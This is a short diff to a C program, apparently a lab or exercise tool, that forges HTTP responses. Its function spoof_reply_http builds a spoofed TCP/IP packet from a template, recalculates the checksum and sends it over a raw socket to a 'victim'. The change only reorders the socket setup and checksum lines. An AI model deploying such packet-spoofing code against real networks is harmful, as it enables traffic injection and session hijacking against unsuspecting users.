@@ -29,10 +29,6 @@ void send_raw_ip_packet(int sock, u_char *ip, int n, struct sockaddr_in dstInfo)
 void spoof_reply_http(ipheader *ip) {
 	int IP_HEADER_LEN = ip -> iph_ihl * 4;
 	tcpheader *tcpReceive = (tcpheader *) ((u_char *)ip + IP_HEADER_LEN);
-
-	int enable = 1;
-	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-	setsockopt(sock , IPPROTO_IP , IP_HDRINCL , &enable, sizeof(enable));
 	
 	/* Read template of IP packet*/
 	FILE *f = fopen( "http.bin", "rb");
@@ -74,14 +70,16 @@ void spoof_reply_http(ipheader *ip) {
 	printf("respond seq %" PRIu32 "\n", ntohl(tcpSend -> th_seq));
 	printf("respond ack %" PRIu32 "\n", ntohl(tcpSend -> th_ack));
 
+	/* Re-calculate TCP checksum */
+	tcpSend -> th_sum = calculate_tcp_checksum((ipheader *) ipData);
+
 	/* Dst info to send by raw socket*/
+	int enable = 1;
+	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	setsockopt(sock , IPPROTO_IP , IP_HDRINCL , &enable, sizeof(enable));
 	struct sockaddr_in dstInfo;
 	dstInfo.sin_family = AF_INET;
 	dstInfo.sin_addr.s_addr = (ipSend -> iph_dstip).s_addr;
-	//dstInfo.sin_port = tcpReceive->th_sport;
-
-	/* Re-calculate TCP checksum */
-	tcpSend -> th_sum = calculate_tcp_checksum((ipheader *) ipData);
 
 	/*send sproof IP packet to victim*/
 	send_raw_ip_packet(sock, ipData , n, dstInfo);
